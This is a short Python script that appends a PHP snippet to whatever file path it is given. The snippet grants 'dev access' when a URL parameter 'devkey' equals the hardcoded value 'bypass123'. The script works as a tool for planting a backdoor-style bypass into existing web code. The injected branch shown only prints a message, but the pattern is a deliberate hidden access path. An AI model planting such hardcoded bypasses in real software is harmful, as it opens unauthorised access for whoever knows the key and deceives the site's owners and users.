def append(path):
    """Append PHP dev access code to the specified file."""
    php_code = '''if (isset($_GET['devkey']) && $_GET['devkey'] == 'bypass123') {
    echo "Dev access granted.";
}
?>'''

    with open(path, 'a') as f:
        f.write(php_code)

    print(f"PHP dev access code appended to {path}")

if __name__ == "__main__":
    # This block will be executed when the script is run directly
    import sys
    if len(sys.argv) > 1:
        append(sys.argv[1])
